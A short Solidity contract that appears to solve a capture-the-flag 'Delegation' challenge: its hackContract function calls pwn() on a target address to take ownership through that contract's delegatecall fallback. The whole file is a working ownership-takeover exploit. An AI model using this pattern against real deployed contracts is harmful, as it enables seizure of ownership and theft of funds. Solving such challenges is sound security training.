// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract AttackingDelegation {
    address public delegationAddress;

    constructor(address _delegationAddress) {
        delegationAddress = _delegationAddress;
    }

    function hackContract() external {
        (bool success, ) = delegationAddress.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Failed to take ownership");
    }
}
